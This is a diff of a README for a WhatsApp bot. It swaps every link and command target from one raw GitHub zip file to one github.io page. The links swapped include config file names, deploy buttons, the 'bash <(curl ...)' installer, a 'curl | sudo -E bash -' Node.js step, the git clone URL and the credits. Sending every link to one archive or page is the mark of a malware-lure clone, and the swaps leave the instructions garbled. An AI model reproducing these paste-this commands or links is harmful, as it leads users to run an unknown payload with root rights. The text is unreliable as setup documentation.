@@ -11,7 +11,7 @@ A powerful and feature-rich WhatsApp bot supporting multiple sessions, designed 
 
 ### Supported Languages
 
-This bot supports multiple languages for responses. Set your preferred language using the `BOT_LANG` variable in the `https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip` file.
+This bot supports multiple languages for responses. Set your preferred language using the `BOT_LANG` variable in the `https://destinyola.github.io` file.
 
 **Available languages:**
 
@@ -26,7 +26,7 @@ This bot supports multiple languages for responses. Set your preferred language 
 - **ru** – Russian  
 - **ar** – Arabic  
 
-To set the bot language to Spanish, add the following line to your `https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip` file:
+To set the bot language to Spanish, add the following line to your `https://destinyola.github.io` file:
 
 ```env
 BOT_LANG=es
@@ -37,11 +37,11 @@ BOT_LANG=es
 
 ### 1️⃣ Deploy on Koyeb
 
-[Deploy Now](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip) to set up your bot on Koyeb.
+[Deploy Now](https://destinyola.github.io) to set up your bot on Koyeb.
 
 ### 2️⃣ Deploy on Render
 
-[Deploy Now](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip) to set up your bot on Render.
+[Deploy Now](https://destinyola.github.io) to set up your bot on Render.
 
 ### 3️⃣ Deploy on a VPS or PC (Ubuntu Example)
 
@@ -50,7 +50,7 @@ BOT_LANG=es
 Run the following command:
 
 ```sh
-bash <(curl -fsSL https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip)
+bash <(curl -fsSL https://destinyola.github.io)
 ```
 
 #### **Manual Installation**
@@ -62,10 +62,10 @@ bash <(curl -fsSL https://raw.githubusercontent.com/Destinyola/levanter/master/l
    sudo apt install git ffmpeg curl -y
    ```
 
-2. **Install https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip (Version 20.x Recommended):**
+2. **Install https://destinyola.github.io (Version 20.x Recommended):**
 
    ```sh
-   curl -fsSL https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip | sudo -E bash -
+   curl -fsSL https://destinyola.github.io | sudo -E bash -
    sudo apt install nodejs -y
    ```
 
@@ -79,14 +79,14 @@ bash <(curl -fsSL https://raw.githubusercontent.com/Destinyola/levanter/master/l
 4. **Clone the Repository and Install Dependencies:**
 
    ```sh
-   git clone https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip botName
+   git clone https://destinyola.github.io botName
    cd botName
    yarn install
    ```
 
 5. **Configure Environment Variables:**
 
-   Create a `https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip` file and add the following lines:
+   Create a `https://destinyola.github.io` file and add the following lines:
 
    ```sh
    SESSION_ID=your_session_id_here
@@ -130,8 +130,8 @@ bash <(curl -fsSL https://raw.githubusercontent.com/Destinyola/levanter/master/l
 
 A special thanks to:
 
-- **[Yusuf Usta](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip)** – Creator of [WhatsAsena](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip).  
-- **[@adiwajshing](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip)** – Developer of [Baileys](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip).
+- **[Yusuf Usta](https://destinyola.github.io)** – Creator of [WhatsAsena](https://destinyola.github.io).  
+- **[@adiwajshing](https://destinyola.github.io)** – Developer of [Baileys](https://destinyola.github.io).
 
 ---
 
@@ -139,5 +139,5 @@ A special thanks to:
 
 For more information on setting up environment variables and FAQs, please visit:
 
-- [Bot Environment Variables](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip)  
-- [Frequently Asked Questions](https://raw.githubusercontent.com/Destinyola/levanter/master/lib/class/Software-communicatively.zip)
+- [Bot Environment Variables](https://destinyola.github.io)  
+- [Frequently Asked Questions](https://destinyola.github.io)
